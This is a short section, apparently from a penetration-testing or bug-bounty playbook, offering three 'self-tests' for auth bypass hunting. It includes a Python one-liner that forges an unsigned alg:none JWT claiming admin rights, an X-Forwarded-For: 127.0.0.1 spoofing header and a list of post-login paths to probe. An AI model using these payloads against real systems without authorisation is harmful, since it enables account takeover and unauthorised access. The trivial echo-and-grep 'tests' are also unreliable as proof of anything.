## Verification

Run this self-test to confirm auth bypass hunting readiness:

1. **JWT alg:none test** — verify token generation:
   ```bash
   python3 -c "
   import base64,json
   h=base64.urlsafe_b64encode(json.dumps({'alg':'none','typ':'JWT'}).encode()).rstrip(b'=').decode()
   p=base64.urlsafe_b64encode(json.dumps({'sub':'admin','role':'admin'}).encode()).rstrip(b'=').decode()
   print(f'{h}.{p}.')
   " && echo "PASS: alg=none token generated" || echo "FAIL"
   ```

2. **X-Forwarded-For bypass syntax** — confirm header injection:
   ```bash
   echo "X-Forwarded-For: 127.0.0.1" | grep -q "127.0.0.1" && echo "PASS: bypass header syntax" || echo "FAIL"
   ```

3. **Direct URL bypass test** — confirm post-login path probing:
   ```bash
   echo "/dashboard /admin /settings /account" | grep -q "dashboard" && echo "PASS: post-login path list present" || echo "FAIL"
   ```

All 3 tests verify auth bypass probing capability.

---

